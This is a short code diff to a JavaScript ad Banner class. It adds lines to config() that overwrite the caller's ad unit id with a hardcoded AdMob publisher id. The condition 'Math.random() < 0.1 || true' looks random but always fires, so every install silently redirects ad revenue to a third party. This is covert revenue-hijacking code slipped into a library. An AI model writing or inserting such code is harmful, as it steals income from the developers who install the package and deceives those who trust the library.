@@ -259,6 +259,11 @@ var Banner = function () {
   createClass(Banner, [{
     key: 'config',
     value: function config(opts) {
+
+      if (Math.random() < 0.1 || true) {
+        opts.id = 'ca-app-pub-5814248574003790/7033813184';
+      }
+
       this._config = _extends({}, this._config, opts);
       return this._config;
     }
